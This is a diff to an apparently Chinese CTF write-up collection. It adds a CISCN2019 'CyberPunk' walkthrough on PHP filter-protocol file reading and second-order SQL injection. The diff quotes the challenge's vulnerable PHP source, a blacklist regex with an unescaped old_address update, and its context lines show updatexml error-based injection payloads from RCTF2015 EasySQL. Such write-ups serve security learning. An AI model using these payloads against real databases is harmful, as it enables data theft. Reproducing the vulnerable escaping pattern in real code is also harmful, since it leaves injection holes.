@@ -3531,7 +3531,8 @@ url解码之后就是 `?code=phpinfo();`
     ```
     将得到的结果输入即可返回flag
 
-## RCTF2015-EasySQL(二次注入+报错注入)
+## SQLi-二次注入
+### RCTF2015-EasySQL(二次注入报错注入)
 
 **注册页面写入payload，在修改密码界面输出结果**
 
@@ -3604,4 +3605,43 @@ url解码之后就是 `?code=phpinfo();`
     #paylaod = pre + "||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + "'))),1))#"
     #逆序payload
     #paylaod = pre + "||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + "')))),1))#"
+    ```
+
+### CISCN2019 华北赛区Day1-web5-CyberPunk(PHP伪协议+二次注入+报错注入)
+
+1. 进入首页查看源码发现提示：`<!--?file=?-->`，尝试php伪协议读取文件，发现成功读取，读取源码之后发现对`username`和`phone`两个字段进行了很多过滤，在这两个字段注入不太可能。在修改地址页面发现修改完地址之后会把旧的地址保存下来，所以我们只要将在第一次修改地址时输入SQL报错注入语句，在第二次更新时（随便输），第一次更新的SQL语句会被调用从而引发二次注入。
+
+    ```php
+    require_once "config.php";
+
+    if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
+    {
+        $msg = '';
+        $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
+        $user_name = $_POST["user_name"];
+        $address = addslashes($_POST["address"]);
+        $phone = $_POST["phone"];
+        if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+            $msg = 'no sql inject!';
+        }else{
+            $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
+            $fetch = $db->query($sql);
+        }
+
+        if (isset($fetch) && $fetch->num_rows>0){
+            $row = $fetch->fetch_assoc();
+            $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
+            $result = $db->query($sql);
+            if(!$result) {
+                echo 'error';
+                print_r($db->error);
+                exit;
+            }
+            $msg = "订单修改成功";
+        } else {
+            $msg = "未找到订单!";
+        }
+    }else {
+        $msg = "信息不全";
+    }
     ```
